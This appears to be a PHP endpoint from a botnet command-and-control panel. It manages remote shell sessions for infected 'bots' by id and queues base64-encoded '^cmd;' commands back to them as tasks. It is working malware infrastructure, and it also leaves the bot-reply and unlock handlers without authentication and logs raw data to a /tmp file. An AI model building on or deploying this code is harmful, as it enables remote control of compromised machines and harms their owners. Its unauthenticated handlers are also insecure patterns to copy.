<?php

	require_once("security.php");
	require_once("mod_login.php");
	require_once("db.php");

	$option = trim($_GET['option']);
	$botid = trim($_GET['bid']);
	$data = trim($_GET['data']);

	if(empty($data) && !empty($_POST['data']))
		$data = trim($_POST['data']);

	if(empty($option) && !empty($_POST['option']))
		$option = trim($_POST['option']);

	if(empty($botid) && !empty($_POST['bid']))
		$botid = trim($_POST['bid']);


	if(!empty($data)) {
		if(($data = base64_decode($data,true))==FALSE)
			exit(0);
        }

	
	$option = __security_input($option,0);
	//$data = __security_input($data,0);
	$botid = __security_input($botid,0);
	
	switch($option) {
		default:
		case 0: // DOM object request 
			if(__login_status()==false) //logged for security 
	                	exit(0);

			else 
				__db_shell_get($botid);								
			break;

		case 1:
			if(__login_status()==false)
				exit(0);

			__db_shell_add($botid);
			break;

		case 2:
			if(__login_status()==false)
				exit(0);
			
			__db_shell_del($botid);
			break;	

		case 3: // bot reply or logging to bot console
			__db_shell_push($botid,$data);
			if(substr($data,0,1)!='^')
				$data = "^cmd;" . $data;
		
			//debug
			$file = fopen("/tmp/prueba001.txt", "a");
			fwrite($file, $data);
			fclose($file);

			__db_task_push($botid,base64_encode($data));
			break;
		case 4:
			__db_shell_unlock($botid);
			break;	
		
	}

	
?>
